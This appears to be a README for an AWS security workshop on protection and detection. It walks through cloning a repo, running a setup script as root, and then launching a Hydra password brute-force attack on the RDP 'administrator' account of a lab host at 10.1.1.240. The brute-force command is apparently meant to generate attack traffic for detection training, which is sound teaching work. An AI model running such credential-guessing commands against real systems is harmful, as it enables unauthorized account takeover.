# security-workshop

[Workshop Link](https://catalog.us-east-1.prod.workshops.aws/workshops/7c1f0b1e-d112-4ebc-acb1-c88e3d18cb71/en-US/modules/protect-detect)

login as ec2-user
```
sudo su -l ec2-user
```

run the following command to pull the repo:
```
git clone https://github.com/yybian/security-workshop.git
```
run the following command to make the bashscript executable
```
cd security-workshop
sudo chmod +x env-setup.sh
```
run the shell script
```
sudo ./env-setup.sh
```

run the following command to initiate the attack:
```
hydra -t 1 -V -f -l administrator -P /home/ec2-user/passwords/password_list.txt rdp://10.1.1.240
```

